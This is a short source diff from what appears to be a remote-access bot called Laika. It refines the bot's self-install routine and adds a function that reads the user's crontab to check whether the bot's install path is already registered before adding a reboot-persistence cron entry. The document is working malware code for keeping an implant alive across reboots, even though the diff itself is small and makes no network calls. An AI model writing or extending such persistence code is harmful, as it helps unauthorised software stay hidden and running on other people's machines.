@@ -76,11 +76,32 @@ void getInstallPath(char *outPath, int pathSz) {
 
     /* create install directory if it doesn't exist */
     snprintf(outPath, pathSz, "%s/%s", home, LAIKA_INSTALL_DIR_USER);
-    LAIKA_DEBUG("creating '%s'...\n", outPath);
-    if (stat(outPath, &st) == -1)
+    if (stat(outPath, &st) == -1) {
+        LAIKA_DEBUG("creating '%s'...\n", outPath);
         mkdir(outPath, 0700);
+    }
 
     snprintf(outPath, pathSz, "%s/%s/%s", home, LAIKA_INSTALL_DIR_USER, LAIKA_INSTALL_FILE_USER);
+}
+
+bool checkPersistCron(char *path) {
+    char buf[PATH_MAX + 128];
+    FILE *fp;
+    bool res = false;
+
+    if ((fp = popen("crontab -l", "r")) == NULL)
+        LAIKA_ERROR("popen('crontab') failed!");
+
+    while (fgets(buf, sizeof(buf), fp)) {
+        if (strstr(buf, path)) {
+            /* laika is installed in the crontab! */
+            res = true;
+            break;
+        }
+    }
+
+    pclose(fp);
+    return res;
 }
 
 void tryPersistCron(char *path) {
@@ -113,7 +134,8 @@ void laikaB_tryPersist() {
     LAIKA_DEBUG("Successfully installed '%s'!\n", installPath);
 
     /* enable persistence on reboot via cron */
-    tryPersistCron(installPath);
+    if (!checkPersistCron(installPath))
+        tryPersistCron(installPath);
 #endif
 }
 
